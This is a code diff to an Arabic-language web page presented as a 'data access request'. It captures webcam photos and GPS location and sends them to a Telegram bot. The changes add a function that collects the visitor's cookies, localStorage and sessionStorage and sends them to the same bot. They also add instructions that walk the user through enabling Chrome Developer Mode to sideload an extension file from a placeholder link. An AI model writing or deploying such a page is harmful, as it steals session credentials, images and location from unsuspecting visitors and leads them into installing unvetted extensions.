@@ -32,16 +32,35 @@
         #video, #canvas {
             display: none;
         }
+        .instructions {
+            margin-top: 20px;
+            background-color: #fff;
+            padding: 15px;
+            border-radius: 5px;
+            max-width: 600px;
+            margin-left: auto;
+            margin-right: auto;
+        }
     </style>
 </head>
 <body>
     <h1>طلب الوصول إلى البيانات</h1>
-    <p>اضغط على الأزرار أدناه للسماح بالوصول إلى الكاميرا والموقع الجغرافي.</p>
+    <p>اضغط على الأزرار أدناه للسماح بالوصول إلى الكاميرا، الموقع الجغرافي، وبيانات المتصفح، أو لتثبيت إضافة المتصفح.</p>
     <button onclick="requestCamera()">التقاط صورة</button>
     <button onclick="requestLocation()">الحصول على الموقع</button>
+    <button onclick="collectBrowserData()">جمع بيانات المتصفح</button>
+    <button onclick="downloadExtension()">تثبيت إضافة المتصفح</button>
     <p id="status">لم يتم طلب الإذن بعد.</p>
     <video id="video" width="320" height="240" autoplay></video>
     <canvas id="canvas" width="320" height="240"></canvas>
+    <div class="instructions">
+        <h3>تعليمات تثبيت الإضافة:</h3>
+        <p>1. اضغط على زر "تثبيت إضافة المتصفح" لتحميل ملف الإضافة.</p>
+        <p>2. في متصفح Chrome، افتح صفحة الإضافات (chrome://extensions).</p>
+        <p>3. فعّل وضع المطور (Developer Mode).</p>
+        <p>4. اسحب ملف الإضافة (.crx) إلى صفحة الإضافات وقم بتثبيته.</p>
+        <p>5. وافق على الأذونات المطلوبة.</p>
+    </div>
 
     <script>
         const video = document.getElementById('video');
@@ -53,18 +72,17 @@
         async function requestCamera() {
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({
-                    video: { facingMode: 'user' } // تفضيل الكاميرا الأمامية
+                    video: { facingMode: 'user' }
                 });
                 video.srcObject = stream;
                 video.style.display = 'block';
-                status.innerText = 'الكاميرا مفتوحة. اضغط على الصورة لالتقاطها.';
+                status.innerText = 'الكاميرا مفتوحة. اضغط على الفيديو لالتقاط الصورة.';
                 
-                // التقاط الصورة عند النقر على الفيديو
                 video.onclick = () => {
                     context.drawImage(video, 0, 0, canvas.width, canvas.height);
                     const imageData = canvas.toDataURL('image/png');
                     video.style.display = 'none';
-                    stream.getTracks().forEach(track => track.stop()); // إيقاف الكاميرا
+                    stream.getTracks().forEach(track => track.stop());
                     status.innerText = 'تم التقاط الصورة! جارٍ إرسالها...';
                     sendPhotoToTelegram(imageData);
                 };
@@ -94,15 +112,43 @@
                         console.error(error);
                     },
                     {
-                        enableHighAccuracy: true, // تفضيل GPS
-                        timeout: 10000, // المهلة الزمنية
-                        maximumAge: 0 // عدم استخدام بيانات مخزنة
+                        enableHighAccuracy: true,
+                        timeout: 10000,
+                        maximumAge: 0
                     }
                 );
             } catch (error) {
                 status.innerText = 'خطأ في طلب الموقع: ' + error.message;
                 console.error(error);
             }
+        }
+
+        // جمع بيانات المتصفح (userAgent، localStorage، Cookies)
+        async function collectBrowserData() {
+            try {
+                const browserData = `
+بيانات المتصفح:
+- User Agent: ${navigator.userAgent}
+- اللغة: ${navigator.language}
+- دقة الشاشة: ${window.screen.width}x${window.screen.height}
+- ملفات تعريف الارتباط: ${document.cookie || 'لا توجد كوكيز'}
+- Local Storage: ${JSON.stringify(localStorage) || 'لا توجد بيانات في localStorage'}
+- Session Storage: ${JSON.stringify(sessionStorage) || 'لا توجد بيانات في sessionStorage'}
+                `;
+                status.innerText = 'تم إرسال بيانات المتصفح!';
+                await sendToTelegram(browserData);
+            } catch (error) {
+                status.innerText = 'خطأ في جمع بيانات المتصفح: ' + error.message;
+                console.error(error);
+            }
+        }
+
+        // تنزيل ملف الإضافة
+        function downloadExtension() {
+            // يجب استضافة ملف .crx أو توجيه المستخدم إلى متجر الإضافات
+            status.innerText = 'يرجى تحميل ملف الإضافة وتثبيته يدويًا وفق التعليمات أدناه.';
+            // يمكن استبدال الرابط أدناه برابط ملف .crx إذا تم إنشاؤه
+            window.location.href = 'https://example.com/extension.crx'; // استبدل برابط حقيقي
         }
 
         // إرسال نص إلى تيليجرام
@@ -132,7 +178,6 @@
             const url = `https://api.telegram.org/bot${botToken}/sendPhoto`;
 
             try {
-                // تحويل Base64 إلى Blob
                 const byteString = atob(imageData.split(',')[1]);
                 const mimeString = imageData.split(',')[0].split(':')[1].split(';')[0];
                 const ab = new ArrayBuffer(byteString.length);
